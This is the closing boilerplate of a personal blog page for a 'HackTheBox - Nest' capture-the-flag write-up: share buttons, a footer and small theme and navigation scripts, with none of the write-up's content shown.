<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nest on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Nest&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-nest%2f&hashtags=OSCP-plus%2cWindows%2cSMB%2cAlternate-Data-Stream%2cdotN%2cVB%2cReverse-engineering%2cdnSpy%2cpsexec.py"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nest on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-nest%2f&title=HackTheBox%20-%20Nest&summary=HackTheBox%20-%20Nest&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-nest%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nest on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-nest%2f&title=HackTheBox%20-%20Nest"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nest on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-nest%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nest on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Nest%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-nest%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nest on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Nest&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-nest%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<script>var toc=document.getElementsByClassName('inner')[0],pTag=document.getElementsByClassName('post-meta')[0],fromTop=pTag.getBoundingClientRect().top,fromBottom=pTag.getBoundingClientRect().bottom;document.addEventListener('scroll',function(b){let a=document.documentElement.scrollTop+75;a>fromTop?(toc.style.visibility='visible',toc.style.opacity='1'):(toc.style.visibility='hidden',toc.style.opacity='0')})</script>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>